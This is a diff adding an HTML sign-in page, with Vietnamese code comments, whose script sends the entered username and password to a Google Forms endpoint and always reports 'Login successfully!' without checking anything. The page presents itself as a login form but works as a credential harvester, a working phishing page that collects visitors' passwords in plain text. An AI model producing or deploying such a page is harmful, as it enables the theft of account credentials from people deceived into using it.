@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="icon" type="image/jpg" href="pics/favicon.jpg">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Submit form</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css">
+</head>
+<body style="background-color:snow;">
+
+<div class="form" style="max-width: 600px; margin: 0 auto; box-sizing: 1px; box-shadow: 2px 3px 4px black; border-radius: 1%;">
+
+    <a href="index.html" style="font-size: 20px;"><i class='bx bx-home'>Home</i></a>
+    <h3 class="text-center text-uppercase" style="padding: 50px; color: Red; font-size: 40px;"><b>SIGN IN</b></h3>
+    <form action="" method="post" id="submit_form">
+        <div class="msg"></div>
+        <div class="form-group">
+            <label for="">Username</label><i class='bx bxs-user' ></i>
+            <input type="text" name="fullname" class="form-control"/>
+            <span class="required"></span>
+        </div>
+
+        <div class="form-group">
+            <label for="">Password</label><i class='bx bxs-lock-alt'></i>
+            <input type="password" name="password" class="form-control"/>
+            <span class="required"></span>
+        </div> <br>
+        <label style="padding: 0px 70px;">
+            <input type="checkbox" checked="checked" name="remember"> Remember me
+        </label>
+<br>
+        <button type="submit" class="btn btn-primary" style="text-align: center; width: 100%; padding: 10px 50px;">LOGIN</button>
+    </form>
+</div>
+<style>
+    
+    .form{
+        
+        background-color:pink;
+        padding: 100px auto;
+        height: 640px;
+    }
+    .form-group{
+        width: 100%;
+        padding: 10px 60px;
+    }
+    button{
+        text-align: center;
+        padding: 10px 60px;
+    }
+
+</style> 
+</body>
+<script type="text/javascript">
+    document.querySelector('#submit_form').onsubmit=function(e){
+        e.preventDefault();
+
+        //truy cap vao msg
+        let msg0j = document.querySelector('.msg');
+        //reset thong bao
+        msg0j.innerText = '';
+
+        //Truy cap vao thanh phan html tuong ung
+        let fullName0j = document.querySelector('input[name="fullname"]');
+        let password0j = document.querySelector('input[name="password"]');
+        
+        //lay gia tri nguoi dung nhap vao
+        let fullName = fullName0j.value;
+        let password = password0j.value;
+
+        //validate form
+
+        //reset thong bao
+        let required0j = document.querySelectorAll('.required');
+        if (required0j.length>0){
+            required0j.forEach(function(item){
+                item.innerText = '';
+            });
+        }
+
+        let errores = {}
+        if (fullName.trim()==''){
+            errores['fullname'] = '*You must fill this';
+            fullName0j.parentElement.querySelector('.required').innerText = errores['fullname'];
+        }
+
+        if (password.trim()==''){
+            errores['password'] = '*You must fill this';
+            password0j.parentElement.querySelector('.required').innerText = errores['password'];
+        }
+
+        if (Object.keys(errores).length==0){
+            //khong co loi gi
+            let data = {
+                'entry.1788197004': fullName,
+                'entry.1271960673': password
+            }
+            
+            let queryString = new URLSearchParams(data);
+            queryString = queryString.toString();
+            
+            msg0j.innerHTML = '';
+
+            let xhr = new XMLHttpRequest();
+            xhr.open("POST", 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSd8gdl8nVnJ4Bn3IKfhKAMHakNvyDwYByCHRw-JgusYW40Oyw/formResponse', true);
+
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+            msg0j.innerHTML = '<div class="alert alert-success text-center">Login successfully!</div>';
+
+            //Reset field sau khi gui xong
+            fullName0j.value = '';
+            password0j.value = '';
+
+            xhr.send(queryString);
+            
+
+        }else{
+            msg0j.innerHTML = '<div class="alert alert-danger text-center">Please check your information</div>';
+        }
+    }
+
+</script>
+<style>
+    .required{
+        color: red;
+    }
+</style>
+</html>
